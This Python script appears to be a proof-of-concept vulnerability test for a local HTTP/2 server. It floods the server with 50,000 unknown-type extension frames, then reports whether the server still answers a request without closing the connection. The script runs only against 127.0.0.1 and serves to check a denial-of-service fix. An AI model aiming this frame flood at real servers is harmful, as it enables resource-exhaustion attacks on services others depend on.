from __future__ import annotations

import asyncio
import datetime
import os
import socket
import ssl
import sys
import tempfile
import threading
from pathlib import Path
from time import perf_counter

sys.path.insert(0, str(Path(__file__).parents[1]))
from http2 import support as h2
from wreath import Wreath
from wreath.reactor import metal_event_loop
from wreath.server import Server, ServerConfig, TLSConfig

FLOOD_FRAMES = 50_000
UNKNOWN_FRAME_TYPE = 0xFA


def _certificate() -> tuple[str, str]:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "localhost")])
    now = datetime.datetime.now(datetime.UTC)
    certificate = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=1))
        .sign(key, hashes.SHA256())
    )
    cert_fd, cert_path = tempfile.mkstemp(suffix=".pem")
    key_fd, key_path = tempfile.mkstemp(suffix=".pem")
    os.write(cert_fd, certificate.public_bytes(serialization.Encoding.PEM))
    os.close(cert_fd)
    os.write(
        key_fd,
        key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ),
    )
    os.close(key_fd)
    return cert_path, key_path


def _exchange(
    port: int,
    output: list[tuple[bytes, float]],
    loop: asyncio.AbstractEventLoop,
    finished: asyncio.Event,
) -> None:
    started = perf_counter()
    response = bytearray()
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_alpn_protocols(["h2"])
        raw = socket.create_connection(("127.0.0.1", port), timeout=5)
        with context.wrap_socket(raw, server_hostname="localhost") as client:
            unknown = h2.encode_frame(UNKNOWN_FRAME_TYPE, 0, 0, b"")
            headers = h2.build_headers_frame(
                1,
                [
                    (b":method", b"GET"),
                    (b":path", b"/health"),
                    (b":scheme", b"https"),
                    (b":authority", b"localhost"),
                ],
                end_stream=True,
            )
            try:
                client.sendall(
                    h2.PREFACE + h2.encode_settings({}) + unknown * FLOOD_FRAMES + headers
                )
            except OSError:
                # A fixed server closes while the already-buffered flood is
                # still being written; the GOAWAY bytes remain readable.
                pass
            client.settimeout(2)
            try:
                while part := client.recv(4096):
                    response += part
                    parser = h2.FrameParser()
                    parser.feed(bytes(response))
                    if any(
                        frame.type == h2.GOAWAY
                        or (frame.type == h2.HEADERS and frame.stream_id == 1)
                        for frame in parser.frames()
                    ):
                        break
            except OSError, TimeoutError:
                pass
    finally:
        output.append((bytes(response), perf_counter() - started))
        loop.call_soon_threadsafe(finished.set)


async def _drive(server: Server, port: int) -> tuple[bytes, float]:
    output: list[tuple[bytes, float]] = []
    loop = asyncio.get_running_loop()
    finished = asyncio.Event()
    thread = threading.Thread(target=_exchange, args=(port, output, loop, finished))
    thread.start()
    await finished.wait()
    thread.join()
    await server.close()
    return output[0]


def _outcome(response: bytes) -> tuple[bytes | None, bool]:
    parser = h2.FrameParser()
    parser.feed(response)
    decoder = h2.HpackDecoder()
    status = None
    goaway = False
    for frame in parser.frames():
        if frame.type == h2.HEADERS and frame.stream_id == 1:
            status = dict(decoder.decode(frame.payload)).get(b":status")
        elif frame.type == h2.GOAWAY:
            goaway = True
    return status, goaway


def main() -> int:
    cert_path, key_path = _certificate()
    handled: list[bool] = []
    app = Wreath()

    @app.get("/health")
    async def health(request) -> str:
        handled.append(True)
        return "ok"

    loop = metal_event_loop(gc_mode="stock")
    try:
        tls = TLSConfig(certfile=cert_path, keyfile=key_path)
        config = ServerConfig(
            host="127.0.0.1",
            port=0,
            protocols=("h2",),
            lifespan="off",
        )
        server = Server(app, config, loop)
        loop.run_until_complete(server._start(ssl=tls.build_ssl_context(("h2",)), tls=None))
        port = server.sockets[0].getsockname()[1]
        response, elapsed = loop.run_until_complete(_drive(server, port))
    finally:
        loop.close()
        os.unlink(cert_path)
        os.unlink(key_path)

    status, goaway = _outcome(response)
    vulnerable = status == b"200" and handled == [True] and not goaway
    print(f"input: {FLOOD_FRAMES:,} frames / {FLOOD_FRAMES * 9:,} bytes")
    print(f"elapsed: {elapsed:.3f}s")
    print(f"HTTP/2 :status {status!r}; GOAWAY={goaway}")
    print("VULNERABLE: unbounded extension-frame work" if vulnerable else "not vulnerable")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(main())
